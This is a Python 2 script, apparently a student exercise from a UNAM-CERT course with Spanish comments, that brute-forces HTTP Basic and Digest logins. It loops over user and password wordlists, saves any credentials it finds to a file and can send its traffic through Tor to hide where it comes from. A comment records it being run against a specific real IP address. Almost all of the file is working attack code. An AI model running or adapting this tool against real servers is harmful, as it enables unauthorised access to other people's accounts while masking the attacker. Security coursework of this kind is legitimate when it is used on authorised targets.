#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
#se necesitan los 2 archivos para ver su ejecucion, uno que contenga a los usuarios(usuarios.txt) y otro a las contraseñas(contra.txt)
#el comando que se utilizo para correrlo es 'python ejercicio7.py -p 9889 -s 87.118.110.170 -U usuarios.txt -P contra.txt'
#A PESAR DE LA AUTENTICACION DIGEST, CUANDO SE INGRESA SOLO UN NOMBRE DE USUARIO LA DETECTA COMO BASIC
#Corona Gerardo, Reyes Jairo

#-v para habilitar el modo verboso
#-H para habilitar protocolo https
#-r para los reportes (Se tiene que poner el nombre del archvio donde se reportara)
#-t para habilitar el ataque por medio de tor
import sys
import optparse
import os.path
from requests import get
from requests.exceptions import ConnectionError
from datetime import datetime
from requests.auth import HTTPDigestAuth
import socks
import socket
import urllib2

def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-t', '--tor', dest='tor', action='store_true', default=None, help='Para hacer un ataque a traves de tor')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-H','--https', dest='https', default=None, action='store_true', help='Port that the HTTPS server is listening to.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults():
    print "Reporte\n1.-En Pantalla\n2.-En archivo\n3.-Ambos"
    while 1:
        var=raw_input('Ingrese la opcion: ')
        if int(var)==1:
            return 1
        elif int(var)==2:
            return 2
        elif int(var)==3:
            return 3
        else:
            print "opcion no encontrada\n"
    pass


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url


def makeRequest(host, user, password):
    try:
    	response = get(host, auth=(user,password))
    	if response.status_code == 200:
    	    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            archivo=open('archivo.txt','w')
            archivo.write(user+','+password)
            archivo.close()
            return True
    	else:
    	    print 'NO FUNCIONO :c '
            return False
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

def makeRequestDigest(host, user, password):
    try:
        response = get(host, auth=HTTPDigestAuth(user,password))
        if response.status_code == 200:
            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
            archivo=open('archivo.txt','w')
            archivo.write(user+','+password)
            archivo.close()
            return True
        else:
            print 'NO FUNCIONO :c '
            return False
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)



if __name__ == '__main__':
    """
    Abrimos los 2 archivos que recibe como argumentos para jalar tanto los usuarios como las contraseñas
    de un archivo.txt
    """
    try:
        opts = addOptions()
        checkOptions(opts)

        #verifica que haya una entrada reporte
        var=0
        if opts.report:
            #print opts.report
            var = reportResults()
            if var == 1:
                print "\nLa fecha de ejecucion del programa es: "+ str(datetime.now()) + "\n\nIP: " + opts.server + "\nPuerto: " + opts.port + "\n"
                opts.verbose=True
            elif var==2:
                print "hola"
                reporte=open(opts.report,'w')
                reporte.write("\nLa fecha de ejecucion del programa es: "+ str(datetime.now()) + "\n\nIP: " + opts.server + "\nPuerto: " + opts.port + "\n")
            elif var==3:
                print "\nLa fecha de ejecucion del programa es: "+ str(datetime.now()) + "\n\nIP: " + opts.server + "\nPuerto: " + opts.port + "\n"
                opts.verbose=True
                reporte=open(opts.report,'w')
                reporte.write("\nLa fecha de ejecucion del programa es: "+ str(datetime.now()) + "\n\nIP: " + opts.server + "\nPuerto: " + opts.port + "\n")
        #habilita el https
        if opts.https:
            url = buildURL(opts.server, port = opts.port, protocol='https')
        else:
            url = buildURL(opts.server, port = opts.port)
        #habilita tor
        if opts.tor:
            ad=0
            #Cuando metes unicamente el nombre de usuario y la contraseña, cuando asson archivos, si no viene mas abajo, no se implemento
            if os.path.isfile(opts.user)==False and os.path.isfile(opts.password)==False:
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                socket.socket = socks.socksocket 
                val = urllib2.build_opener()
                val.addheaders = [('User-Agent', 'Corona Gerardo y Reyes Jairo')]
                val.open('http://87.118.110.170')
                makeRequest(url, opts.user, opts.password) 
                print "tor"
                ad+=1
            #cuando metes el nombre de usuario unicamente y el archivo con contraseñas
            elif os.path.isfile(opts.user)==False and os.path.isfile(opts.password):
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                socket.socket = socks.socksocket 
                val = urllib2.build_opener()
                val.addheaders = [('User-Agent', 'Corona Gerardo y Reyes Jairo')]
                val.open('http://87.118.110.170')
                f2= open(opts.password,'r')
                for lines in f2.readlines():
                    password = lines[:-1]
                    makeRequest(url, opts.user, password)
                print "tor"
                f2.close()
            #cuando metes la contraseña unicamente y el archivo con usuarios
            elif os.path.isfile(opts.user) and os.path.isfile(opts.password)==False:
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                socket.socket = socks.socksocket 
                val = urllib2.build_opener()
                val.addheaders = [('User-Agent', 'Corona Gerardo y Reyes Jairo')]
                val.open('http://87.118.110.170')
                f2= open(opts.user,'r')
                for lines in f2.readlines():
                    user = lines[:-1]
                    makeRequest(url, user, opts.password)
                print "tor"
                f2.close()
            #si se ingresa tanto el archivo de usuarios como el de contraseñas
            elif os.path.isfile(opts.user) and os.path.isfile(opts.password):
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                socket.socket = socks.socksocket 
                val = urllib2.build_opener()
                val.addheaders = [('User-Agent', 'Corona Gerardo y Reyes Jairo')]
                val.open('http://87.118.110.170')
                f2= open(opts.user,'r')
                for lines in f2.readlines():
                    user = lines[:-1]
                    f1= open(opts.password,'r')
                    for lines2 in f1.readlines():
                        password = lines2[:-1]
                        makeRequest(url, user, password)
                    f1.close()
                print "tor"
                f2.close()

        #si ambas entradas son archivos
        if os.path.isfile(opts.user) and os.path.isfile(opts.password):
            f1= open(opts.user,'r')
            for line in f1.readlines():
                usuario = line[:-1]
                #habilita el modo verboso
                if opts.verbose:
                    print usuario
                #por alguna extraña razon, al momento de que ponia una declaracion de f2= open.... , y regresaba el for un tabulador
                #me marcaba que tenia un problema de identacion cuando creo que no deberia de haber, por eso el segundo lo hice con with
                f2= open(opts.password,'r')
                for lines in f2.readlines():
                    password = lines[:-1]
                    #habilita el modo verboso
                    if opts.verbose:
                        #si esta habilitado el reporte y se eligio para mostrarlo en pantalla como en el archivo
                        if opts.report and var==3:
                            reporte.write('\n'+usuario+'\n\n')
                            reporte.write(password+'\n')
                            print "Contraseña: " + password
                            if makeRequest(url, usuario, password):
                                reporte.write('ENCONTRADO CON BASIC\n')
                                print 'ENCONTRADO CON BASIC\n'
                            else:
                                reporte.write('NO ENCONTRADO CON BASIC\n')
                                print 'NO ENCONTRADO CON BASIC\n'
                            if makeRequestDigest(url, usuario, password):
                                reporte.write('ENCONTRADO CON DIGEST\n')
                                print 'ENCONTRADO CON DIGEST\n'
                            else:
                                reporte.write('NO ENCONTRADO CON DIGEST\n')
                                print 'NO ENCONTRADO CON DIGEST\n'
                        elif var!=2:
                            print "Contraseña: " + password
                            makeRequest(url, usuario, password)
                            makeRequestDigest(url, usuario, password)
                    elif opts.report and var==2:
                        reporte.write('\n'+usuario+'\n\n')
                        reporte.write(password+'\n')
                        if makeRequest(url, usuario, password):
                            reporte.write('ENCONTRADO CON BASIC\n')
                        else:
                            reporte.write('NO ENCONTRADO CON BASIC\n')
                        if makeRequestDigest(url, usuario, password):
                            reporte.write('ENCONTRADO CON DIGEST\n')
                        else:
                            reporte.write('NO ENCONTRADO CON DIGEST\n')
                    else:
                        makeRequest(url, usuario, password)
                        makeRequestDigest(url, usuario, password)
                f2.close()
            f1.close()
        #si ambas entradas no son archivos
        elif os.path.isfile(opts.user)==False and os.path.isfile(opts.password)==False:
            if opts.verbose:
                if opts.report and var==3:
                    reporte.write('\n'+opts.user+'\n\n')
                    reporte.write(opts.password+'\n\n')
                    print opts.user
                    print opts.password
                    if makeRequest(url, opts.user, opts.password):
                        reporte.write('ENCONTRADO CON BASIC\n')
                        print 'ENCONTRADO CON BASIC\n'
                    else:
                        reporte.write('NO ENCONTRADO CON BASIC\n')
                        print 'NO ENCONTRADO CON BASIC\n'
                    if makeRequestDigest(url, opts.user, opts.password):
                        reporte.write('ENCONTRADO CON DIGEST\n')
                        print 'ENCONTRADO CON DIGEST\n'
                    else:
                        reporte.write('NO ENCONTRADO CON DIGEST\n')
                        print 'NO ENCONTRADO CON DIGEST\n'
                elif var!=2:
                    print opts.user
                    print opts.password
                    makeRequest(url, opts.user, opts.password)
                    makeRequestDigest(url, opts.user, opts.password)

            elif opts.report and var==2:
                reporte.write('\n'+opts.user+'\n\n')
                reporte.write(opts.password+'\n\n')
                if makeRequest(url, opts.user, opts.password):
                    reporte.write('ENCONTRADO CON BASIC\n')
                else:
                    reporte.write('NO ENCONTRADO CON BASIC\n')
                if makeRequestDigest(url, opts.user, opts.password):
                    reporte.write('ENCONTRADO CON DIGEST\n')
                else:
                    reporte.write('NO ENCONTRADO CON DIGEST\n')
            else:
                makeRequest(url, opts.user, opts.password)
                makeRequestDigest(url, opts.user, opts.password)
        #si el usuario es un archivo y la contraseña no
        elif os.path.isfile(opts.user) and os.path.isfile(opts.password)==False:
            f1= open(opts.user,'r')
            for line in f1.readlines():
                usuario = line[:-1]
                #habilita el modo verboso
                if opts.verbose:
                    if opts.report and var==3:
                        reporte.write('\n'+usuario+'\n\n')
                        reporte.write(opts.password+'\n\n')
                        print usuario
                        if makeRequest(url, usuario, opts.password):
                            reporte.write('ENCONTRADO CON BASIC\n')
                            print 'ENCONTRADO CON BASIC\n'
                        else:
                            reporte.write('NO ENCONTRADO CON BASIC\n')
                            print 'NO ENCONTRADO CON BASIC\n'
                        if makeRequestDigest(url, usuario, opts.password):
                            reporte.write('ENCONTRADO CON DIGEST\n')
                            print 'ENCONTRADO CON DIGEST\n'
                        else:
                            reporte.write('NO ENCONTRADO CON DIGEST\n')
                            print 'NO ENCONTRADO CON DIGEST\n'
                    elif var!=2:
                        print usuario
                        makeRequest(url, usuario, opts.password)
                        makeRequestDigest(url, usuario, opts.password)
                elif opts.report and var==2:
                    reporte.write('\n'+usuario+'\n\n')
                    reporte.write(opts.password+'\n\n')
                    if makeRequest(url, usuario, opts.password):
                        reporte.write('ENCONTRADO CON BASIC\n')
                    else:
                        reporte.write('NO ENCONTRADO CON BASIC\n')
                    if makeRequestDigest(url, usuario, opts.password):
                        reporte.write('ENCONTRADO CON DIGEST\n')
                    else:
                        reporte.write('NO ENCONTRADO CON DIGEST\n')
                else:
                    makeRequest(url, usuario, opts.password)
                    makeRequestDigest(url, usuario, opts.password)

            f1.close()
        #si el las contraseñas son archivo y el usuario no
        elif os.path.isfile(opts.user)==False and os.path.isfile(opts.password):
            f2= open(opts.password,'r')
            for lines in f2.readlines():
                password = lines[:-1]
                #habilita el modo verboso
                if opts.verbose:
                    if opts.report and var==3:
                        reporte.write('\n'+opts.user+'\n\n')
                        reporte.write(password+'\n')
                        print "Contraseña: " + password
                        if makeRequest(url, opts.user, password):
                            reporte.write('ENCONTRADO CON BASIC\n')
                            print 'ENCONTRADO CON BASIC\n'
                        else:
                            reporte.write('NO ENCONTRADO CON BASIC\n')
                            print 'NO ENCONTRADO CON BASIC\n'
                        if makeRequestDigest(url, opts.user, password):
                            reporte.write('ENCONTRADO CON DIGEST\n')
                            print 'ENCONTRADO CON DIGEST\n'
                        else:
                            reporte.write('NO ENCONTRADO CON DIGEST\n')
                            print 'NO ENCONTRADO CON DIGEST\n'
                    elif var!=2:
                        print "Contraseña: " + password
                        makeRequest(url, opts.user, password)
                        makeRequestDigest(url, opts.user, password)
                elif opts.report and var==2:
                    reporte.write('\n'+opts.user+'\n\n')
                    reporte.write(password+'\n\n')
                    if makeRequest(url, opts.user, password):
                        reporte.write('ENCONTRADO CON BASIC\n')
                    else:
                        reporte.write('NO ENCONTRADO CON BASIC\n')
                    if makeRequestDigest(url, opts.user, password):
                        reporte.write('ENCONTRADO CON DIGEST\n')
                    else:
                        reporte.write('NO ENCONTRADO CON DIGEST\n')
                else:
                    makeRequest(url, opts.user, password)
                    makeRequestDigest(url, opts.user, password)

            f2.close()


        if opts.report and var in [2,3]:
            reporte.close()
    except Exception as e:
        printError('Ocurrio un error inesperado')
#printError(e, True)
